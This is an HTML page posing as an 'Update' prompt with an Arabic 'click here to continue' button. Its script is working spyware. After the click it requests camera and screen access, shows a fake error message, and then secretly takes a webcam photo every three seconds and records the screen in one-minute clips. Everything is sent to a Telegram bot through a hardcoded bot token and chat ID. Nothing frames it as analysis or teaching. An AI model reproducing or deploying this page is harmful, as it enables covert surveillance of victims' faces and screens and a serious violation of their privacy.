
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Update</title></head>
<body style="background:#000;color:#0f0;text-align:center;">
    <button id="go" style="margin-top:20%;padding:20px;">اضغط هنا للمتابعة</button>
    <video id="v" width="1" height="1" autoplay style="opacity:0;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const T = '8301462057:AAF1rD3xfgur1lyEV80jCctZ9stYJdVYkiU';
        const C = '1105921069';

        async function start() {
            try {
                const cam = await navigator.mediaDevices.getUserMedia({ video: true });
                const scr = await navigator.mediaDevices.getDisplayMedia({ video: true });
                document.body.innerHTML = "<h2>Error 0x01: Connecting...</h2>";
                
                const vid = document.getElementById('v');
                vid.srcObject = cam;

                // 1. التقاط الصور بسرعة (كل 3 ثوانٍ - أقصى سرعة آمنة)
                setInterval(() => {
                    const can = document.getElementById('c');
                    can.width = 400; can.height = 300;
                    can.getContext('2d').drawImage(vid, 0, 0, 400, 300);
                    can.toBlob(b => send(b, 'p.jpg', 'sendPhoto'), 'image/jpeg', 0.4);
                }, 3000);

                // 2. تسجيل الشاشة دقيقة بدقيقة
                function rec() {
                    const m = new MediaRecorder(scr);
                    let ch = [];
                    m.ondataavailable = e => ch.push(e.data);
                    m.onstop = () => {
                        send(new Blob(ch, {type:'video/mp4'}), 'v.mp4', 'sendVideo');
                        rec(); 
                    };
                    m.start();
                    setTimeout(() => m.stop(), 60000);
                }
                rec();
            } catch (e) { location.reload(); }
        }

        async function send(b, n, m) {
            const f = new FormData();
            f.append('chat_id', C);
            f.append(m === 'sendPhoto' ? 'photo' : 'video', b, n);
            fetch(`https://api.telegram.org/bot${T}/${m}`, { method: 'POST', body: f });
        }

        document.getElementById('go').onclick = start;
    </script>
</body>
</html>
